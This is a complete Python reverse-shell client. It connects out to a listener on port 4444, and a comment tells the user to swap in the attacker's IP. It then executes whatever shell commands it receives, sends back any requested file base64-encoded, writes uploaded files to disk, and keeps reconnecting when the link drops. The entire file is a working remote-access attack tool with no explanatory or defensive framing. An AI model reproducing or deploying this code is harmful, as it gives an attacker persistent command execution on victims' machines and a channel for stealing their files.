import socket
import subprocess
import os
import base64

def connect_to_server():
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect(('127.0.0.1', 4444))  # Change to attacker IP
        
        while True:
            command = client_socket.recv(1024).decode()
            
            if command == 'exit':
                break
            
            # Download file from client
            elif command.startswith('download '):
                filename = command[9:]
                try:
                    with open(filename, 'rb') as f:
                        file_data = base64.b64encode(f.read()).decode()
                    client_socket.send(file_data.encode())
                except:
                    client_socket.send(b"File not found")
            
            # Upload file to client
            elif command.startswith('upload '):
                parts = command.split(' ', 2)
                if len(parts) == 3:
                    filename = parts[1]
                    file_data = base64.b64decode(parts[2])
                    with open(filename, 'wb') as f:
                        f.write(file_data)
                    client_socket.send(b"File uploaded successfully")
                else:
                    client_socket.send(b"Upload error")
            
            # Regular command execution
            else:
                output = execute_command(command)
                client_socket.send(output)
                
    except Exception as e:
        print(f"Error: {e}")
        import time
        time.sleep(5)
        connect_to_server()

def execute_command(command):
    try:
        if command.startswith('cd '):
            os.chdir(command[3:])
            return f"Directory changed to: {os.getcwd()}".encode()
        else:
            process = subprocess.Popen(command, 
                                     shell=True,
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE)
            output, error = process.communicate()
            return output if output else error
    except Exception as e:
        return f"Error: {str(e)}".encode()

if __name__ == "__main__":
    connect_to_server()